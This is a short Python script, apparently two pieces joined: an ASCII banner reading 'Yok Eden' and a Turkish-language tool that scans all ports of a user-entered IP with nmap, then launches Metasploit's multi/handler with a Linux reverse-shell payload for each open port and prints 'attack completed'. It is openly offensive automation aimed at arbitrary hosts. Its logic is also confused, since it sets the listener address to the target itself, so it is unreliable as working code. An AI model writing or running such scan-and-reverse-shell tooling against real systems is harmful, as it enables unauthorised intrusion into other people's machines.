def ascii_art():
    art = '''
    $$\     $$\         $$\             $$$$$$$$\      $$\                     
    \$$\   $$  |        $$ |            $$  _____|     $$ |                    
     \$$\ $$  /$$$$$$\  $$ |  $$\       $$ |      $$$$$$$ | $$$$$$\  $$$$$$$\  
      \$$$$  /$$  __$$\ $$ | $$  |      $$$$$\   $$  __$$ |$$  __$$\ $$  __$$\ 
       \$$  / $$ /  $$ |$$$$$$  /       $$  __|  $$ /  $$ |$$$$$$$$ |$$ |  $$ |
        $$ |  $$ |  $$ |$$  _$$<        $$ |     $$ |  $$ |$$   ____|$$ |  $$ |
        $$ |  \$$$$$$  |$$ | \$$\       $$$$$$$$\\$$$$$$$ |\$$$$$$$\ $$ |  $$ |
        \__|   \______/ \__|  \__|      \________|\_______| \_______|\__|  \__|  
    '''
    print(art)

if __name__ == "__main__":
    ascii_art()
import nmap
import os

def derin_port_tarama(ip_adresi):
    nm = nmap.PortScanner()
    print(f"Derin port taraması {ip_adresi} üzerinde başlatılıyor...")
    nm.scan(ip_adresi, '1-65535', '-A')
    print(f"Tarama tamamlandı: {nm[ip_adresi].all_protocols()}")

    open_ports = []
    for proto in nm[ip_adresi].all_protocols():
        for port in nm[ip_adresi][proto]:
            if nm[ip_adresi][proto][port]['state'] == 'open':
                open_ports.append(port)
    
    return open_ports

def msfconsole_payload(ip_adresi, open_ports):
    print(f"Metasploit Payload başlatılıyor {ip_adresi} için...")
    for port in open_ports:
        print(f"Port {port} açık, Metasploit ile payload denenecek...")
        os.system(f"msfconsole -q -x 'use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST {ip_adresi}; set LPORT {port}; run'")
    print("Saldırı tamamlandı.")

if __name__ == "__main__":
    ip_adresi = input("Port taraması yapmak istediğiniz IP adresini girin: ")
    open_ports = derin_port_tarama(ip_adresi)
    
    if open_ports:
        msfconsole_payload(ip_adresi, open_ports)
    else:
        print("Açık port bulunamadı, işlem sonlandırılıyor.")
